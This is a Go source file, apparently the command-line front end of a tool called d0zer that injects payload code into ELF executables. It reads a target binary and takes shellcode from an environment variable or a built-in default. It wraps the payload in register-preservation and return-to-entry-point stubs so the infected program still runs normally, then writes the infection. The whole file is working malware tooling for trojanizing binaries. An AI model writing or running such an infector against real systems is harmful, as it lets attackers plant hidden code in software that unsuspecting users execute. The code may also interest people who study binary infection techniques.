package main

import (
	"debug/elf"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"strings"

	"github.com/d0zer/elfinfect"
)

func printPayload(p []byte) {
	fmt.Println("------------------PAYLOAD----------------------------")
	fmt.Printf("%s", hex.Dump(p))
	fmt.Println("--------------------END------------------------------")
}

func getPayloadFromEnv(p io.Writer, key string) (int, error) {
	val, ok := os.LookupEnv(key)
	if !ok {
		errorString := "Environmental variable " + key + " is not set"
		return 0, errors.New(errorString)
	}

	if val == "" {
		errorString := "Environmental variable " + key + " contains no payload"
		return 0, errors.New(errorString)
	}
	val = strings.ReplaceAll(val, "\\x", "")
	decoded, err := hex.DecodeString(val)
	if err != nil {
		log.Fatal(err)
	}

	return p.Write(decoded)
}

/*
	Export :
	getFileContents
	WriteDefault
*/
func main() {

	debug := flag.Bool("debug", false, "see debug output (generated payload, modifications, etc)")
	pEnv := flag.String("payloadEnv", "", "name of the environmental variable holding the payload")
	oFile := flag.String("target", "", "path to binary targetted for infection")
	pFile := flag.String("payloadBin", "", "path to binary containing payload")
	noPres := flag.Bool("noPreserve", false, "prevents d0zer from prepending its register preservation routine to your payload")
	noRest := flag.Bool("noRestoration", false, "prevents d0zer from appending register restoration routine to your payload")
	noRetOEP := flag.Bool("noRetOEP", false, "prevents d0zer from appending ret-to-OEP (continue execution after payload) to payload")
	flag.Parse()

	if *oFile == "" {
		flag.PrintDefaults()
		log.Fatal("No target binary supplied")
	}
	t := new(elfinfect.TargetBin)

	fh, err := os.Open(*oFile)
	if err != nil {
		log.Fatal(err)
	}

	t.Fh = fh
	defer t.Fh.Close()

	if err := t.GetFileContents(); err != nil {
		fmt.Println(err)
		return
	}

	if !t.IsElf() {
		fmt.Println("This is not an Elf binary")
		return
	}

	if err := t.EnumIdent(); err != nil {
		fmt.Println(err)
		return
	}

	if *noPres == false {
		t.WritePreservationStub()
	}

	switch {

	case *pEnv != "" && *pFile != "":
		flag.PrintDefaults()
		return

	case *pEnv == "" && *pFile == "":
		if t.EIdent.Arch == elf.ELFCLASS64 {
			t.Payload.Write(elfinfect.DefaultPayload64)
		} else {
			t.Payload.Write(elfinfect.DefaultPayload32)
		}

	case *pEnv != "":
		if _, err := getPayloadFromEnv(&t.Payload, *pEnv); err != nil {
			fmt.Println(err)
			return
		}

	case *pFile != "":
		fmt.Println("Getting payload from an ELF binary .text segment is not yet supported")
		return
	}

	if err := t.MapHeader(); err != nil {
		fmt.Println(err)
		return
	}

	if err := t.GetSectionHeaders(); err != nil {
		fmt.Println(err)
		return
	}

	if err := t.GetProgramHeaders(); err != nil {
		fmt.Println(err)
		return
	}

	if err := t.InfectBinary(*debug, *noRest, *noRetOEP); err != nil {
		fmt.Println(err)
		return
	}
}
